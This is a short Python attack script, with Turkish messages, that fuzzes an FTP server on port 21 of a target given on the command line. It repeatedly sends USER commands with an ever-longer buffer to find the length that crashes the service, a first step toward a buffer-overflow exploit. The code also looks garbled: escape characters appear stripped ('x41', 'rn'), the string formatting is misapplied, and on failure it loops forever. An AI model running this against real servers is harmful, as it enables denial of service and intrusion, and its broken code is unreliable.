import sys, socket
from time import sleep
bold = "\033[1m"
underline = "\033[4m"
green = "\033[92m"
blue = "\033[94m"
yellow = "\033[93m"
red = "\033[91m"
endcolor = "\033[0m"
hedef = sys.argv[1]
yolla_buf = 'x41'*50
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((hedef,21))
        s.recv(1024)
        print(bold+yellow+"[*]{} Uzunluğunda bir buf gönderiliyor.."+endcolor.format(str(len(yolla_buf))))
        s.send("USER "+yolla_buf+"rn")
        s.close()
        sleep(1)
        yolla_buf = yolla_buf + 'x41'*50
    except:
        print(bold+green+"[+] {} Uzunluğunda hata verdi!"+endcolor.format(str(len(yolla_buf))))
